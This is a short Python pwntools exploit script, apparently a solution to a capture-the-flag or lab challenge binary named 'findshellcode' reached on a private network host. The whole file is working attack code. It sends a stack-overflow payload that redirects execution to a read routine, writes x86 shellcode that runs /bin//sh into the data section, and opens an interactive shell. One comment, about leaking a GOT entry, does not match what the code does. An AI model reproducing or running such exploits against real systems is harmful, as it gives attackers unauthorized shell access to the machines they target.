# -*- coding: utf-8 -*-

from pwn import *

pwnable_filename = "./findshellcode"

Io = remote("192.168.210.11", 10004)
# Io = process(pwnable_filename)

pwnable = ELF(pwnable_filename)

_start_addr = 0x080480B8
read_function_addr = 0x080480FD
data_section_addr = 0x0804919C

junk_size = 0x30
junk = "A" * junk_size

shellcode = "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# Leak puts got
payload = flat([
    junk,
    p32(read_function_addr),
    p32(data_section_addr),
    p32(0),
    p32(data_section_addr),
    p32(len(shellcode)),
])
print "[+] Payload: %r" % (payload)

Io.sendline(payload)
Io.sendline(shellcode)


Io.interactive()
